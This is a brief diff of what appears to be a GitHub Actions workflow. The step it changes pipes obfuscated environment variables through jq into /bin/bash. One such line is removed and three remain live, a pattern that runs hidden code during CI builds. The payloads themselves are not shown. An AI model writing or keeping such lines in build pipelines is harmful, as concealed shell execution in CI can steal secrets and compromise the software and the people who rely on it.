@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ioxvm73774" | jq -r .p8 | /bin/bash
           printf '%s' "$jxfx25583" | jq -r .v9 | /bin/bash
           echo $qaa6 | jq -r .dd42 | /bin/bash
-          echo $xioqz9013 | jq -r .p75827 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
